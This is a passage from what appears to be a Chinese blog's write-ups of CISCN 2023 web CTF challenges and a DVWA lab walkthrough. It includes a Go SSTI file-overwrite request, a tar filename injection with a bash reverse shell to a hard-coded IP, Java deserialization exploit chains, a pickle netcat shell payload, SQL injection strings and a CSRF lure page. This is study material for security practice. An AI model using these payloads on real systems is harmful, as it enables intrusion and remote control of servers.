c.Writer) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } } c.String(200, \"Hello, guest\") } 首先是靠SESSION_KEY环境变量的key对session加密，接着判断session中的name键值是否为空，如果是空的话，赋值为guest。但不论name值如何，这里最后回显都是Hello, guest Admin路由： func Admin(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] != \"admin\" { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } name := c.DefaultQuery(\"name\", \"ssti\") xssWaf := html.EscapeString(name)//防止xss tpl, err := pongo2.FromString(\"Hello \" + xssWaf + \"!\") if err != nil { panic(err) } out, err := tpl.Execute(pongo2.Context{\"c\": c}) if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } c.String(200, out) } 这里判断session的name是否为admin，如果不是则返回500，之后获取url中name的值，如果没有则默认为ssti 之后通过pongo2框架进行渲染 Flask路由 func Flask(c *gin.Context) { session, err := store.Get(c.Request, \"session-name\") if err != nil { http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return } if session.Values[\"name\"] == nil { if err != nil { http.Error(c.Writer, \"N0\", http.StatusInternalServerError) return } } resp, err := http.Get(\"http://127.0.0.1:5000/\" + c.DefaultQuery(\"name\", \"guest\")) if err != nil { return } defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) c.String(200, string(body)) } 判断session的name是否为空，如果为空则返回500；之后向本地的5000端口发送get请求，最后将响应的信息输出 session伪造 我们需要进行伪造的原因是，只有session中的name值为admin的时候我们才能利用pongo2的ssti漏洞进行rce 经过wp的参考：由于没有找到session-key泄露的点，因此会尝试去爆破key或者猜测从key就是空。 这里他们猜测为空的原因是：试了一会发现 os.Getenv 如果获取不存在的环境变量就会返回空值 这里可以做出如上图所示的修改，随后运行，在F12中找到cookie MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ== 之后我们复制cookie覆盖原有数据包中的cookie即可，如下图成功伪造 接下来访问flask路由，这里师傅们是对flask的name进行畸形传参而引发报错（但我不太懂为何）这里将name赋值为空即可报错 将报错的源码，复制到一个html上打开即可，如下图找到对应的app源码 注意到这里debug开启了，根据师傅们所说：这就表明，Flask框架是热加载的，server.py发生改变，程序也会更新，可以利用admin路由执行Go代码去覆盖掉server.py实现rce，XssWaf会转义双引号，可以通过UA和Referer绕过传参 我们知道pongo2模板引擎存在注入点，可以执行go的代码，所以我们可以先上传文件覆盖server.py，再访问/flask路由，来执行命令 构造payload 这里就是知识盲区了。。。 使用gin包的SaveUploadedFile()进行文件上传 func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error 第一个获取表单中的文件，第二个参数为保存的目录 所以使用ssti的payload为 {{c.SaveUploadedFile(c.FormFile(\"file\"),\"/app/server.py\")}} 但是我们在前面代码审计的时候知道，双引号会被html.EscapeString转义进行编码，所以需要绕过 我们利用gin中的Context.HandlerName() HandlerName 返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers” 所以如果是在Admin()里，返回的就是main/route.Admin，然后配合过滤器last获取到最后一个字符串也就是文件名为n 还有一个Context.Request.Referer()Request.Referer：返回header里的Referer的值 我们可以在请求中的Referer的值添加为/app/server.py，所以构造最终payload {{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())} 但是在数据包中添加请求头时还要添加 Content-Type 头 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND 对于添加这个头的解释是 对表单提交，浏览器会自动设置合适的 Content-Type 请求，同时 生成一个唯一的边界字符串，并在请求体中使用这个边界字符串将表单字段和文件进行分隔。如果表单中包含文件上传的功能，需要 使用 multipart/form-data 类型的请求体格式。 注意分隔符的开始和结束格式 --分隔符 ... ... --分隔符-- 覆盖server.py，访问./admin，数据包如下 GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())}} HTTP/1.1 Host: node5.anna.nssctf.cn:28661 Referer: /app/server.py Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: session-name=MTcwOTM3NTc4NHxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXw8FvDB_aTI-00gfsWKaEOxC_DgmOTwM0DX2_DSD_NxBQ== Upgrade-Insecure-Requests: 1 Content-Length: 423 ------WebKitFormBoundary8ALIn5Z2C3VlBqND Content-Disposition: form-data; name=\"n\"; filename=\"1.py\" Content-Type: text/plain from flask import * import os app = Flask(__name__) @app.route('/') def index(): name = request.args['name'] file=os.popen(name).read() return file if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=5000, debug=True) ------WebKitFormBoundary8ALIn5Z2C3VlBqND-- 成功上传，然后就在./flask去命令执行，因为我们知道该路由获取name是c.DefaultQuery，因此需要构造 ?name=?name=env//这样拼接以后才是http://127.0.0.1:5000/?name=env 参考文章 [CISCN 2023 初赛]go_session 2023 CISCN 初赛 Web Writeup [CISCN 2023 初赛]go_session [CISCN 2023 华北]pysym from flask import Flask, render_template, request, send_from_directory import os import random import string app = Flask(__name__) app.config['UPLOAD_FOLDER']='uploads' #定义上传路径 @app.route('/', methods=['GET']) def index(): return render_template('index.html') @app.route('/',methods=['POST']) def POST(): #判断是否有文件存在 if 'file' not in request.files: return 'No file uploaded.' file = request.files['file'] #判断文件大小 if file.content_length &gt; 10240: return 'file too lager' #生成上传路径 path = ''.join(random.choices(string.hexdigits, k=16)) #生成最终上传路径,拼接uploads directory = os.path.join(app.config['UPLOAD_FOLDER'], path) #创建文件夹 os.makedirs(directory, mode=0o755, exist_ok=True) #生成最终文件的保存路径 savepath=os.path.join(directory, file.filename) file.save(savepath) try: #对指定文件解压到指定目录 os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) except: return 'something wrong in extracting' links = [] for root, dirs, files in os.walk(directory): for name in files: extractedfile =os.path.join(root, name) #检查是否存在符号链接 if os.path.islink(extractedfile): os.remove(extractedfile) return 'no symlink' #检查是否为目录 if os.path.isdir(path) : return 'no directory' links.append(extractedfile) return render_template('index.html',links=links) @app.route(\"/uploads/&lt;path:path&gt;\",methods=['GET']) def download(path): #下载文件 filepath = os.path.join(app.config['UPLOAD_FOLDER'], path) if not os.path.isfile(filepath): return '404', 404 return send_from_directory(app.config['UPLOAD_FOLDER'], path) if __name__ == '__main__': app.run(host='0.0.0.0',port=1337) 经分析，上述的os.system('tar --absolute-names -xvf {} -C {}'.format(savepath,directory)) 这一处代码的savepath可控，可造成rce 先通过 | 连接符号绕过，再用反弹指令进行base64编码绕过一些特殊字符的过滤。 test.tar | echo bash -c 'bash -i &gt;&amp; /dev/tcp/124.220.233.26/8888 0&gt;&amp;1' | base64 -d | bash | #base64编码 test.tar | echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi84ODg4ICAwPiYxJw== | base64 -d | bash | 发送之前记得开启监听 参考文章 CISCN往届国赛复现 ciscn2023华北赛区 [CISCN 2023 初赛]DeserBug 找了几篇文章，都是基本直接给出答（都是老手了，不屑于），Java没做过几次，就是个菜鸟，这里下去补，直接给出答案了，今后学会再说。 这道题是Java经典CC链的翻版： import cn.hutool.json.JSONObject; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.util.Base64; import java.util.HashMap; import java.util.Map; import static com.app.Tools.getBytes; import static com.app.Tools.setFieldValue; import static com.app.Tools.*; public class POC { public static void main(String[] args) throws Exception { byte[] bytes = getBytes(\"Evil\"); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \"_name\", \"Sentiment\"); setFieldValue(templates, \"_class\", null); setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes}); Myexpect myexpect = new Myexpect(); myexpect.setTargetclass(TrAXFilter.class); myexpect.setTypeparam(new Class[]{Templates.class}); myexpect.setTypearg(new Object[]{templates}); JSONObject jsonObject = new JSONObject(); ConstantTransformer transformer = new ConstantTransformer(1); Map outerMap = LazyMap.decorate(jsonObject,transformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap , \"Sentiment\"); HashMap hashMap = new HashMap(); hashMap.put(tiedMapEntry, \"1\"); jsonObject.remove(\"Sentiment\"); setFieldValue(transformer,\"iConstant\",myexpect); byte[] serialize = serialize(hashMap); System.out.println(Base64.getEncoder().encodeToString(serialize)); //unserialize(serialize); } } 参考文章 2023 CISCN 初赛 Web Writeup [CISCN 2023]—DeserBug [CISCN 2023 西南]dataapi 决赛题目，看不懂，发布wp的人也少，留着吧，┭┮﹏┭┮ 参考文章 CISCN西南复赛AWDPlus Web [CISCN 2023 华北]normal_snake 又是Java反序列化，看不懂。。。考的是C3P0利用链：EXP如下 public class Main2 { private static String string = \"\"; private static byte[] data; public static void main(String[] args) throws Exception { //URLClassLoader C3P0DataSource c3P0DataSource = new C3P0DataSource(); Class clazz = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Constructor declaredConstructor = clazz.getDeclaredConstructor(); declaredConstructor.setAccessible(true); PoolBackedDataSourceBase poolBackedDataSourceBase = (PoolBackedDataSourceBase)declaredConstructor.newInstance(); setFieldValue(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\",poolBackedDataSourceBase,\"connectionPoolDataSource\",c3P0DataSource); serialize(poolBackedDataSourceBase); //unserialize(); String hexAscii = ByteUtils.toHexAscii(data); System.out.println(hexAscii); String poc = \"!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; {userOverridesAsString: \\\"HexAsciiSerializedMap:\" +hexAscii+ \";\\\"}\"; System.out.println(poc); Yaml yaml = new Yaml(); //yaml.load(poc); } public static void setFieldValue(String className,Object object, String field_name, Object field_value) throws Exception { Class clazz = Class.forName(className); Field declaredField = clazz.getDeclaredField(field_name); declaredField.setAccessible(true); declaredField.set(object,field_value); } public static void serialize(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); //string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()); data = byteArrayOutputStream.toByteArray(); } public static void unserialize() throws Exception { //ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string)); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(data); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } } class C3P0DataSource implements ConnectionPoolDataSource, Referenceable { @Override public Reference getReference() throws NamingException { Reference reference = new Reference(\"Payload8\",\"Payload8\",\"http://127.0.0.1:5555/payload8.jar\"); //Reference reference = new Reference(\"Payloadxx\",\"Payloadxx\",\"\"); return reference; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } 参考文章 2023 华北分区赛 normal_snake 记几道CTF-Java反序列化题目 [CISCN 2023 华北]ExifT0ol import web import os import exifread web.config.debug = False#关闭调式模式 #定义url路由 urls = ( '/', 'Index', '/upload', 'Upload', '/exifhandler', 'ExifHandler' ) app = web.application(urls, locals()) #传入了路由映射和locals()作为参数。 render = web.template.render('templates/')#用于渲染模板文件 session = web.session.Session(app, web.session.DiskStore(\"sessions\"), initializer={'filename': '', 'filedir': '', 'exif': {}})#用于存储会话信息，并初始化了filename、filedir和exif三个属性。 class Index: def GET(self): return render.upload()#显示上传文件的页面 class Upload: def GET(self): return render.upload() #显示上传文件的表单 def POST(self): params = web.input(file={})#获取上传文件对象 filedir = 'uploads/'#设置问文件上传所保存的目录 if 'file' in params: #如果请求中包含文件对象'file'，则获取文件名并提取文件后缀 filename = params['file'].filename fileext = filename.split('.')[-1] #如果不是指定的后缀，则给出警告，但并不会直接return（也就是没影响） if fileext.lower() not in ['jpg', 'jpeg', 'png', 'gif']: print('Warning: only allow jpg, jpeg, png, gif!') #将文件名和文件目录保存到会话的filename和filedir属性中。 session.filename = filename session.filedir = filedir #打开文件并将文件内容写入到文件中，关闭文件。 fout = open(filedir + filename, 'wb') fout.write(params['file'].value) fout.close() return \"&lt;script&gt;alert('successfully uploaded');window.location.href='/exifhandler'&lt;/script&gt;\" else: return 'no file' class ExifHandler: def GET(self): #检查会话中的filename和exif属性是否为空，以确定是否有文件上传和是否已经获取过EXIF信息。 if session.filename != '' and session.exif == {}: #打开上传的文件并使用exifread.process_file(f)方法处理文件，将结果保存到tags变量中。 with open(session.filedir + session.filename, 'rb') as f: tags = exifread.process_file(f) exif_info = {} #遍历tags字典，将以'EXIF'开头的标签和对应的值保存到exif_info字典中。 for tag, value in tags.items(): if tag.startswith('EXIF'): exif_info[tag] = str(value) session.exif = exif_info #将exif_info保存到会话的exif属性中，然后使用render.result方法渲染结果页面，并将filename和exif_info传递给模板进行显示。 return render.result(filename=session.filename, exif_info=exif_info) elif session.filename == '' and session.exif == {}: return \"&lt;script&gt;alert('no file uploaded');window.location.href='/'&lt;/script&gt;\" else: return render.result(filename=session.filename, exif_info=session.exif) if __name__ == '__main__': app.run() 分了上述代码在结合wp，这道题就是通过上传文件来覆盖session文件，覆盖之后，会自动经过ExifHandler路由进行处理，最终会通过模板渲染回显到页面（应该就是这里会造成漏洞） 既然是session文件，那就得利用反序列化，以序列化数据存入，最终渲染的时候反序列化，执行我们的恶意文件 虽然上述有白名单的检查，但是没有return之类的，只是单纯的警告，因此无用。 由于filename是可控的,而且也没有对其做任何过滤，此处就会有一个任意文件上传漏洞。 先构造payload import itsdangerous import pickle, pickletools import os class test(): def __init__(self): self.name = \"test\" def __reduce__(self): return (os.system, (\"nc ip port -e /bin/bash\", )) a = pickletools.optimize((pickle.dumps(test(), 4))) print(itsdangerous.base64_encode(a)) 这里不清楚的点就是为何在构造payload做了那些优化，最后还是编码了一下 将脚本输出内容上传到 sessions目录下的888 的文件中 这里最后没有复现成功。。。真的难受 参考文章 春秋杯春季联赛&amp;&amp;ciscn2023华北赛区部分题解 参考文章 SSTI（模板注入）漏洞（入门篇） [CISCN 2019华东南]Web11 题解 刷题记录：[CISCN2019 华北赛区 Day2 Web1]Hack World [CISCN2019 华北赛区 Day2 Web1]Hack World --BUUCTF [CISCN2019 华北赛区 Day1 Web1]Dropbox [CISCN2019 华北赛区 Day1 Web1]Dropbox CISCN 2019 初赛 Love Math 刷题记录：[CISCN 2019 初赛]Love Math [CISCN 2019华东南]Web4 BUUCTF：[CISCN2019 华东南赛区]Web4 [CISCN2019 华东南赛区]Double Secret","tags":["CTF赛事"],"categories":["CTF赛事"]},{"title":"重温DVWA","path":"/2024/01/10/shen-ru-dvwa/","content":"0x01 Brute Force Low 这一部分处理用户输入的username与password(md5加密) // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die ( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); 构造查询语句（处理用户输入的用户名和密码）接着与数据库连接，进入数据库进行匹配查询 mysqli_query: 这是 MySQLi 扩展提供的函数，用于执行 SQL 查询。第一个参数是连接标识符，通常使用全局变量 $GLOBALS[\"___mysqli_ston\"]，第二个参数包含sql查询的字符串 or die...如果前面的语句执行失败，就会执行die后面的代码：后面的代码用于获取并输入MySQL错误信息。 首先判断$GLOBALS[\"___mysqli_ston\"]是否为对象，如果是，这说明是存在连接错误，并用mysqli_error函数获取具体的错误信息；如果不是对象，则用mysqli_connect_error获取错误信息 if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful echo \"&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;\"; echo \"&lt;img src=\\\"{$avatar}\\\" /&gt;\"; } else { // Login failed echo \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; } mysqli_num_rows用于获取结果中的行数 如果查询到了返回结果，并且返回的结果行数为1，这说明成功找到对应的用户数据 mysql_fetch_assoc 从结果中取得一行作为关联数组，并获取该关联数组键值为avatar对应的value，随后就是一些信息的展示 调用mysqli_close关闭MySQL连接，并将关闭结果的布尔值赋值为对应的变量，如果成功关闭，返回false；否则返回变量本身的value 综上分析，该网站对于用户的登录次数并没有做出任何限制，可以尽情的爆破 值得注意的是，这里的代码也没有对用户输入的数据进行过滤，这表明我们可以通过sql注入进去。但这里不能使用联合注入，因为并不会回回显相关查询信息。 但幸运的是我们可以进行万能密码和报错注入（因为mysql_error的存在） username=admin'+and+updatexml(1,concat(0x7e,(select version())),1)--+&amp;password=bug&amp;Login=Login# 当然盲注也是可以的，但手工效率低 Medium 中级水平如上所示。在开始的地方，分别对用户输入的username与password数据由mysqli_real_escape_string进行处理，对用户输入的特殊字符进行转义，特殊字符如下 剩下的基本一致，亮点在于，这里如果用户输入的数据与数据库数据不匹配，则会sleep 2，休眠2秒。但这对我们的爆力破解是无用的，只不过延长了我们爆破的时间 High checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 首先调用了个自定义函数checkToken，并向其中传入用户的令牌以及session会话 并且在对用户的用户名和密码输入方面添加了$user = stripslashes( $user );进行处理，stripslashes在于删除用户输入的数据中可能含有的反引号``` 这里依旧同之前的难度基本一致，不过睡眠时间成了随机了 最后这里说该函数是用来生成CSRF令牌的。综上所述，这里防止了CSRF的攻击，但我们仍可以进行暴力破解，不过麻烦的事需要在每次破解的时候，抓取页面的令牌token 这里我们关注一下token的处理，Token 的值来源于 index.php，访问 index.php 查看源码信息，找到如下 token 的位置： require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php'; 我们追踪位置，发现如下代码： 这里的checktoken用于检查用户令牌。如果用户令牌与session会话不相等，则报错，并且还会重定向到index.php；而后续的generate函数用当前的时间戳md5值来生成session，这里复习一波如何用burpsuite来爆破 抓包看到这里多了两个参数，但只需要关注token即可。值得注意的是这里含有302重定向，因此我们在bp设置的时候需要跟随以便获取index.php页面的某些数据 这里看到文章说线程最好设置为1，多线程基本不行 这里我们设置爆破点为password与token，其中payload 1 为正常的密码字典即可。payload2设置为递归提取 递归grep （Recursive grep） 主要用于从服务器端提取有效数据，需先从服务器响应中提取数据在替换payload位置进行正则配置 注意：使用递归搜索时线程必须是1 根据上述图片的步骤设置好，对于token的查找，我们在图片右侧选择获取响应，接着在下面的响应中找到token所在位置，鼠标选中即可，接着你会看到上方已经自动生成好了正则表达式 如上图成功爆破 Impossible 前面的某些部分与High一般，我们重点看新增的 $data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );: 创建一个 PDO 准备语句（prepared statement），该语句用于执行 SQL 查询。查询的目标是从名为 “users” 的表中选择 “failed_login” 和 “last_login” 列的值，条件是 “user” 列等于提供的参数 :user。LIMIT 1 确保只返回一行数据。 $data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );: 绑定参数 :user，这是一个占位符，与预备语句中的 (:user) 对应。将 $user 变量绑定到这个参数，并指定参数类型为字符串（PDO::PARAM_STR）。 之后便是执行该PDO语句，并获取返回结果中的每一行数据 之后如果返回结果中如果只有一行数据且登陆失败的值大于指定的登录失败的值（3）就进入if循环，根据注释，这代表着用户已经被锁定 // 用户被锁定。注意，使用此方法可能导致用户枚举！ // echo \"&lt;pre&gt;&lt;br /&gt;由于登录错误次数过多，此帐户已被锁定。&lt;/pre&gt;\"; // 计算用户何时可以再次登录 这里获取最后一次登录的时间，接着+15*60，也就是禁用15分钟，接着timenow获取当前时间，如果当前时间小于规定的禁用时间，则账户依旧处于被锁定的状态 这里同上述一般，也是进入数据库查询用户输入的内容是否与其匹配 这里说如果用户的内容在数据库中可以找到，并且用户未处于锁定状态，说明用户成功登录。进入if后，获取了到目前为止登陆失败的次数与上一次登录的时间。 然后判断登录次数是否大于网站限制的登录次数，如果超过了，则会提醒用户在此次登录之前，你的账号存在被暴力破解的危险。 然后重置登陆失败的次数为0（因为成功登陆了） 这里是else语句，如果用户未能成功登录，则会将当前用户对应的登陆失败的次数+1。其实这里的代码逻辑应该是先看下部分在看上部分。 那由于这里对爆破次数做了限制：3次。这几乎断绝了我们破解成功的几率。 0x02 Command Injection Low &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; php_uname：这里配合参数s，最终会返回运行次PHP环境的操作系统信息，看是否为Windows系统，根据系统的类别使用适配的ping用法。 这里显而易见没有对用户输入的ip参数做出有效的过滤，这意味着我们可以配合管道符进行命令执行。 由于这里我是Windows下的，我们先简单了解一下Windows下的管道符相关用法： “|”前面需要正确，然后显示后面语句的执行结果 “||”如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假 “&amp;”如果前面的语句为假则直接执行后面的语句，前面的语句为真则依次执行 “&amp;&amp;”如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真 这里我们可以配合|管道符进行命令执行，如上图所示，我们dir成功看到当前目录信息 当然也可以进行文件读取 Medium &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = $_REQUEST[ 'ip' ]; // Set blacklist $substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; 这里上一个level最大的不同就在于，设置了黑名单并且过滤了&amp;&amp;与;分号，不过这并不影响我们，因为这里过滤并不全，我们依旧可以向上一关一样进行文件读取等命令执行 High &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input $target = trim($_REQUEST[ 'ip' ]); // Set blacklist $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); // Remove any of the characters in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } ?&gt; trim：trim — 去除字符串首尾处的空白字符（或者其他字符） 如上所示，这串代码先用trim去除了IP参数内容的空格等字符，随后用更加严格的黑名单进行了过滤。虽然看着很全，但仔细观察会发现，其对|的过滤实际上是这样的| 附加了一个空格，这估计是模拟现实中开发人员的失误。这意味着我们使用|依旧可以命令执行 Impossible &lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $target = $_REQUEST[ 'ip' ]; $target = stripslashes( $target );//去除反斜杠\\字符 // Split the IP into 4 octects $octet = explode( \".\", $target );//将IP使用.符号分隔开 // Check IF each octet is an integer //这里限制死了IP的每一段都需要为整数，且整个IP只能有四个网段 if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int's put the IP back together. $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { // Windows $cmd = shell_exec( 'ping ' . $target ); } else { // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \"&lt;pre&gt;{$cmd}&lt;/pre&gt;\"; } else { // Ops. Let the user name theres a mistake echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'; } } // Generate Anti-CSRF token generateSessionToken(); ?&gt; 如上所示，这里先是判断用户令牌，防止了CSRF攻击，接着去除了IP参数的反斜杠字符，然后将IP内容以点号分隔开，分别判断得到的数组每一位数组元素是否为整数，且整个数组长度只能为4，否则将被视为无效IP。 这种就是白名单过滤的方式了，只要不符合正确的IP格式，则抛出错误，这里我们是无法绕过的。 0x03 CSRF Low &lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass_new = md5( $pass_new ); // Update the database $insert = \"UPDATE `users` SET password = '$pass_new' WHERE user = '\" . dvwaCurrentUser() . \"';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $insert ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); // Feedback for the user echo \"&lt;pre&gt;Password Changed.&lt;/pre&gt;\"; } else { // Issue with passwords matching echo \"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;\"; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res); } ?&gt; 这里直接对用户输入的密码判断是否在两次输入中相等，如果相等，就直接更新密码，并没有对访问来源等做出限制 很明显这里并不能有效的阻止CSRF的存在，如果用户访问我们精心构造的恶意链接，就会造成CSRF，造成恶意代码执行。攻击思路如下： http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780# 如果用户在当前网站访问上述链接，那就会执行密码修改的功能。倘若这时候我们知道了用户名，则我们可以成功冒充用户登录。当然如果对方有点防范意识的话，就不会点击上述很明显可疑的网址，那我们先搞一个简单的短网址来攻击。 在线工具：https://tool.chinaz.com/tools/dwz.aspx 生成如下：http://i7q.cn/5UMMrV 可以看到成功伪造 配合XSS 这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。首先新建一个带有 xss 攻击语句的 html 页面，内容如下： &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&amp;CSRF&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 当受害者访问含有这个html代码的页面的时候，用户的密码就被恶意修改了。 核心语句就是通过 scirpt 标签的 src 属性来记载攻击 payload 的 URL。当然还可以使用iframe、img等标签 Medium &lt;?php if( isset( $_GET[ 'Change' ] ) ) { // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) { // Get input $pass_new = $_GET[ 'password_new' ]; $pass_conf = $_GET[ 'password_conf' ]; // Do the passwords match? if( $pass_new == $pass_conf ) { // They do! $pass_new = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass_new ) : ((trigger_error(\"[MySQLConverterToo] Fix the 